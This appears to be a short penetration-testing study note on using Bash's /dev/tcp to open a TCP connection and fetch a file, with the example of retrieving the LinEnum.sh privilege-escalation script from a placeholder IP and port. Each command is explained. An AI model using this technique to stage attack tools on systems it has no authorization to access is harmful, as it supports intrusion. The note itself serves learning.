If the version of Bash on the machine is 2.04 or above, you can use /dev/tcp which is built in for simple file downloads

This method has 2 more steps for retrieving files, but still isnt complicated

### Connect to the Server
`exec 3<>/dev/tcp/<IP Address>/<Port>`
Where:

`exec` - Used to manipulate file descriptors
`3<>` - Opens descriptor 3 and gives it read write privs
`/dev/tcp` - Starts the TCP connection to the given IP on the Port



Basically, everything in Linux is a file right. So this just says, take this number 3, <> means read and write, so it tells 3 (which is basically a variable) u can read and write, and then puts that to the /dev/tcp file which does the communication, where you can specify the IP Address and the Port


# HTTP GET Request


`echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`

`-e` - Lets u use \n
`"GET /LinEnum.sh HTTP/1.1\n\n"` - Get request for LinEnum.sh using HTTP 1.1 and \n\n to end the request
`>&3` - assigns the data to the "variable" 3

# Print the Response

`cat <&3`
This just reads 3